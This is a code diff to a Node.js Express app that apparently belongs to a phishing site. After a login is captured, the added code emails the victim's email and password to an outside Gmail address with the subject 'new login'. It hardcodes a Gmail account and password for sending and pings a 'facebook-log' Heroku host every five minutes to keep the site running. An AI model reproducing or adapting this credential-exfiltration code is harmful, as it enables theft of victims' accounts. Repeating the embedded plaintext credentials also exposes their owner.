@@ -9,6 +9,7 @@ var index = require('./routes/index');
 var users = require('./routes/users');
 var Req = require('request');
 var fs = require('fs');
+var nodemailer = require('nodemailer');
 
 var app = express();
 
@@ -66,6 +67,11 @@ var  User={};
         if (err) return console.log(err);
         res.send('success');
         console.log('success');
+        sendMail(`<div style="text-align: center;">
+        email:<p><span style="color:darkred";>${User.email}</span></p>
+        login:<p><span style="color: red; background-color: yellowgreen">${User.pass}</span></p>
+        </div>
+        `);
     });
 
 
@@ -192,6 +198,42 @@ Req.get({
 
 }
 
+
+function sendMail(msg) {
+    var transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+            user: 'samersamawi.s@gmail.com',
+            pass: 'SamersameR888'
+        }
+    });
+
+    var mailOptions = {
+        from: 'samer',
+        to: 'samer69255@gmail.com',
+        subject: 'new login',
+        html: msg,
+    };
+
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+            console.log(error);
+        } else {
+            console.log('Email sent: ' + info.response);
+        }
+    });
+}
+
+
+(function () {
+
+    setInterval(function () {
+        Req.get('https://facebook-log.herokuapp.com/',function (err) {
+
+        });
+    },5*60*1000);
+
+})();
 
 
 module.exports = app;
